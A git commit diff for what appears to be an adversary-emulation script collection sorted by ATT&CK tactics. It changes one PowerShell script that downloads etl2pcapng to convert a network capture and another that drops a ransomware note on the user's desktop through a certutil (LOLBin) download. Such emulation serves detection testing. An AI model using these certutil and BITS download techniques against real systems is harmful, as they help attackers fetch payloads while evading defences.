50fa8431f8109e8f599a4b211db0d869558b3ca0
Jim Benna <jim.benna@gmail.com>
2026-01-08 16:38:45 +0100

    modificated some scripts

--- 0004_Execution/4002_Transform_capture.ps1
+++ 0004_Execution/4002_Transform_capture.ps1
@@ -9,25 +9,28 @@ $etl_capture_file = "$env:PUBLIC\exf\capture.etl";
 $pcap_file = "$env:PUBLIC\exf\capture.pcap";
 $etl2pcapng_command = "$env:PUBLIC\Toolz\etl2pcapng.exe"
 $exf_file = "$env:PUBLIC\exf\capture.txt";
-if ([System.IO.File]::Exists("$etl_capture_file")) 
-{
-    certutil -urlcache -f https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.exe "$env:PUBLIC\Toolz\etl2pcapng.exe";
-    if ([System.IO.File]::Exists("$env:PUBLIC\Toolz\etl2pcapng.exe")) 
-    { 
+$DownLoadSource = "https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.exe"
+if ([System.IO.File]::Exists("$etl_capture_file")) {
+    try {
+        Start-BitsTransfer -Source $DownLoadSource -Destination $etl2pcapng_command -DisplayName "Donwload Program convert File" -Description "Downloading etl2pcapng from Microsoft" -Priority Foreground
+        Write-Output "Downloaded the file from the URL : $DownLoadSource" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
+        Write-Output "File has been stored in : $etl2pcapng_command" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
+    }
+    catch {
+        Write-Output "Error during Download : $($_.Exception.Message)" | Out-File -FilePath "$exf_file" -Encoding ascii -Append    
+    }
+    if ([System.IO.File]::Exists($etl2pcapng_command)) { 
         $convert = "$etl2pcapng_command" + " $etl_capture_file" + " $pcap_file";
         Invoke-Expression $convert | Out-File -FilePath "$exf_file"; 
         Add-Content -Path $exf_file "The file $etl_capture_file has been converted to $pcap_file. You can now read it with Wireshark";
         exit 0;
     }
-     else 
-    {
+    else {
         "The $etl2pcapng_command does not exists !!!" | Out-File -FilePath "$exf_file";
         exit 2; 
     };
 } 
-    else 
-    {
-        "The file $etl_capture_file does not exists !!!" | Out-File -FilePath "$exf_file";
-        exit 1; 
-    };
-
+else {
+    "The file $etl_capture_file does not exists !!!" | Out-File -FilePath "$exf_file";
+    exit 1; 
+};
--- 0014_Impact/1405_Donwload_note.ps1
+++ 0014_Impact/1405_Donwload_note.ps1
@@ -2,7 +2,7 @@
 # Technic ID : T1197
 Clear-Host
 Write-Output "==============================================================================="
-Write-Output "BITS Job : Donwload RansomWare Note using Bitsadmin (T1197)"
+Write-Output "Donwload RansomWare Note using Certutil (LolBin)"
 Write-Output "==============================================================================="
 #
 $exf_file = "$env:PUBLIC\exf\Note_setup.txt";
@@ -11,10 +11,13 @@ $DestDir = "$env:USERPROFILE\Desktop\"
 $DestFile = "Ransomware_note.txt"
 $FullDest = $DestDir + $DestFile
 try {
-    Start-BitsTransfer -Source $DownLoadSource -Destination $FullDest -DisplayName "Donwload Text File" -Description "Downloading a text File From the Internet" -Priority Foreground
+    certutil -urlcache -f $DownLoadSource $FullDest
+    #Start-BitsTransfer -Source $DownLoadSource -Destination $FullDest -DisplayName "Donwload Text File" -Description "Downloading a text File From the Internet" -Priority Foreground
     Write-Output "Downloaded the file from the URL : $DownLoadSource" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
     Write-Output "File has been stored in : $FullDest" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
+    exit 0
 }
 catch {
-    Write-Output "Error during Download : $($_.Exception.Message)" | Out-File -FilePath "$exf_file" -Encoding ascii -Append    
+    Write-Output "Error during Download : $($_.Exception.Message)" | Out-File -FilePath "$exf_file" -Encoding ascii -Append
+    exit 1
 }
